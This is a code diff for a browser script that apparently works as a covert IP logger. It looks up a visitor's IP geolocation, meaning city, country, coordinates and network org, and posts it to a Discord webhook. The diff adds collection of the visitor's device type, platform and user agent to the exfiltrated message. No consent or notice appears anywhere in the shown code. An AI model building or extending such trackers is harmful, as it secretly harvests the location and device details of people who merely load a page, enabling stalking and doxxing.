@@ -31,6 +31,9 @@ async function fetchIPInfo(ip) {
         const data = await response.json();
         console.log('IP information:', data);
 
+        // Get device information (model, platform, user agent)
+        const deviceDetails = getDeviceDetails();
+
         // Create a custom message to send to Discord
         const ipDetails = `
             IP: ${data.ip}
@@ -39,16 +42,43 @@ async function fetchIPInfo(ip) {
             Country: ${data.country || 'N/A'}
             Location: ${data.loc || 'N/A'}
             Org: ${data.org || 'N/A'}
+            Device: ${deviceDetails.device} (${deviceDetails.platform})
+            User Agent: ${deviceDetails.userAgent}
         `;
         
-        // Send the IP information to Discord
+        // Send the IP and device information to Discord
         await sendToDiscord(ipDetails);
     } catch (error) {
         console.error('Error fetching IP information:', error);
     }
 }
 
-// Send the IP address and information to Discord using the webhook
+// Get device details (model, platform, user agent)
+function getDeviceDetails() {
+    const userAgent = navigator.userAgent;
+    const platform = navigator.platform;
+    let device = 'Unknown Device';
+
+    if (userAgent.includes('Android')) {
+        device = 'Android Device';
+    } else if (userAgent.includes('iPhone') || userAgent.includes('iPad')) {
+        device = 'iOS Device';
+    } else if (userAgent.includes('Windows')) {
+        device = 'Windows PC';
+    } else if (userAgent.includes('Mac')) {
+        device = 'MacOS PC';
+    } else if (userAgent.includes('Linux')) {
+        device = 'Linux PC';
+    }
+
+    return {
+        device: device,
+        platform: platform,
+        userAgent: userAgent
+    };
+}
+
+// Send the IP address, device, and other information to Discord using the webhook
 async function sendToDiscord(ipDetails) {
     try {
         // Get the current timestamp in Central Time (Oklahoma timezone)
@@ -63,7 +93,7 @@ async function sendToDiscord(ipDetails) {
             second: 'numeric',          // Seconds (00-59)
         });
 
-        // Create the payload with the timestamp and IP details
+        // Create the payload with the timestamp, IP, and device details
         const payload = {
             content: `IP Information at ${timestamp}:\n${ipDetails}`, // The message sent to the Discord channel
         };
